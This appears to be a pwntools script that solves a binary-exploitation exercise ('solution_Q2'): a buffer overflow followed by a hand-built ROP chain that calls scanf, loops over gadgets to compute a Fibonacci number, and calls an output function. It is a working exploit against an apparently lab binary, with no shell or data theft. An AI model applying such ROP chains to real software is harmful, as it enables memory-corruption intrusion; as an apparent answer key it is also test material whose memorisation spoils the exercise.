from pwn import *

# Create payload file
payload_file = "solution_Q2"

# Gadgets and addresses
scanf_addr = p32(0x080521FF)
add_esp_8_pop_ebx_ret = p32(0x0804901b)
d_format_string = p32(0x080d6361)  # Alternative: 0x080d6361 | 0x080d3037
bss_addr = p32(0x0810c2c0)

xor_eax_ret = p32(0x080497f7)
add_eax_2_ret = p32(0x080b4fd7)

# Constructing the payload
payload = b'A' * 40

# Call scanf("%d", bss_addr)
payload += scanf_addr
payload += add_esp_8_pop_ebx_ret
payload += d_format_string
payload += bss_addr
payload += b"ROPE"  # Padding

# calculatng offset and storing it to memory
payload += p32(0x0804901e)  # pop ebx; ret
payload += p32(0x0810b03d)  						# Address for offset
payload += xor_eax_ret
payload += add_eax_2_ret * 38  # 19 ins | 19 * 4 = 76 bytes | 2bytes * 38
payload += p32(0x0804978c)  # xchg edx, eax; ret
payload += p32(0x080497f2)  # mov dword ptr [ebx + 3], edx; ret  

# From scanf storing value of N in esi
payload += p32(0x0804901e)  # pop ebx; ret
payload += p32(0x0810c2bd)						# Address of bss-3	
payload += p32(0x080497b6)  # mov edx, dword ptr [ebx + 3]; ret
payload += p32(0x0807878f)  # mov esi, edx; ret
payload += p32(0x0804fc58)  # dec esi; ret 				# Setting esi to N-1

#initial setup for loop: setting eax, edx to zero and ecx to 1
payload += p32(0x08061425)  # xor edx, edx; mov eax, edx; ret
payload += p32(0x08049808)  # xor ecx, ecx; ret
payload += p32(0x08049770)  # inc ecx; ret

#loop start
#fetching fib variable from mem to edx
payload += p32(0x0804901e)  # pop ebx; ret
payload += p32(0x0810b041)  						# Address of Fib var
payload += p32(0x080497b6)  # mov edx, dword ptr [ebx + 3]; ret

#main logic to calulate fib (value will be stored in edx)
payload += xor_eax_ret
payload += p32(0x0807508d)  # add eax, edx; add eax, ecx; ret
payload += p32(0x08049794)  # xchg edi, edx; ret
payload += p32(0x080497a1)  # xchg edi, ecx; ret
payload += p32(0x0804978c)  # xchg edx, eax; ret

#storing fib value from edx to mem
payload += p32(0x0804901e)  # pop ebx; ret
payload += p32(0x0810b041)						# Address of fib var
payload += p32(0x080497f2)  # mov dword ptr [ebx + 3], edx; ret

# fetching offset value from mem to edx
payload += p32(0x0804901e)  # pop ebx; ret
payload += p32(0x0810b03d)						# Address of offset value
payload += p32(0x080497b6)  # mov edx, dword ptr [ebx + 3]; ret

#loop condition
payload += xor_eax_ret
payload += p32(0x0804fc58)  # dec esi; ret
payload += p32(0x0806dbc0)  # cmovne eax, edx; ret
payload += p32(0x0804978c)  # xchg edx, eax; ret
payload += p32(0x08049786)  # sub esp, edx; ret

#when loop ends edx should have final fib value
payload += p32(0x0804901e)  # pop ebx; ret
payload += p32(0x0810b041)
payload += p32(0x080497b6)  # mov edx, dword ptr [ebx + 3]; ret

# Final function call
payload += xor_eax_ret
payload += p32(0x0807508d)  # add eax, edx; add eax, ecx; ret
payload += p32(0x08049a9e)  # pop esi; pop edi; ret
payload += p32(0x08052230)
payload += p32(0x080d3037)
payload += p32(0x08079263)  # push eax; push edi; call esi

# Write payload to file
with open(payload_file, "wb") as f:
    f.write(payload)

print("Payload written to file solution_Q2.")

